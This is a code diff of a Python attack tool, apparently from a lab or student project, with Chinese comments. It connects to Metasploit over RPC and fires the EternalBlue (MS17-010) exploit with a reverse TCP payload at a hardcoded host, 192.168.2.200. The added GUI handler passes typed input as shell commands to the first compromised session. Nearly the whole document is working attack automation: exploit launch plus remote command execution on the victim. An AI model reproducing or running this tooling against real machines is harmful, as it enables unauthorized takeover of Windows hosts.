@@ -1,35 +1,67 @@
+import sys
 import threading
 
 from pymetasploit3.msfrpc import MsfRpcClient
 
 from libs.Attack import Attack
 from libs.GUI_Template import GUI_Template
+from libs.Logger import Logger
 from libs.Modules import Modules
 from libs.Payloads import Payloads
 
+logger = Logger('Main')
+client: MsfRpcClient
+
 
 class GUI(GUI_Template):
+    """
+    繼承模板
+    """
+
+    def __init__(self, title):
+        super().__init__(title)
+
     def input_event(self, text):
-        print(f'輸入: {text}')
+        if not client:
+            self.println('請等待 RPC 連線成功再輸入指令')
+            return
+
+        if len(client.sessions.list) == 0:
+            self.println('目前無可用的 session 連線')
+            return
+
+        self.print(text)
+        shell = client.sessions.session(client.sessions.list.keys()[0])
+        self.print(shell.run_shell_cmd_with_output(text))
 
     def global_key_event(self, event):
-        print(f'按鍵: {event}')
+        ...
+        # print(f'按鍵: {event}')
 
 
 def attack_thread(gui):
     """
     異步攻擊線程
 
-    :param gui:
-    :type gui: (GUI)
-    :return:
+    :param  gui:
+    :type   gui: (GUI)
     """
+
     # 建立客戶端
-    client = MsfRpcClient("salt", port=55553, ssl=True)
+    try:
+        logger.info('正在連線到 RPC...')
+        global client
+        client = MsfRpcClient("salt", port=55553, ssl=True)
+        logger.succ('成功連線到 RPC')
+    except:
+
+        logger.err('無法連線到 RPC')
+        sys.exit(1)
 
     # 建立攻擊
     atk = Attack(client, '192.168.2.200', Modules.MS17_010_ETERNALBLUE, Payloads.REVERSE_TCP)
 
+    logger.info('正在開始攻擊...')
     # 開始攻擊
     gui.print(atk.run())
 
@@ -46,4 +78,6 @@ if __name__ == "__main__":
     gui.build()
 
     # 等待攻擊線程完成
+    logger.info('正在關閉...')
     t1.join()
+    logger.info('關閉完成')
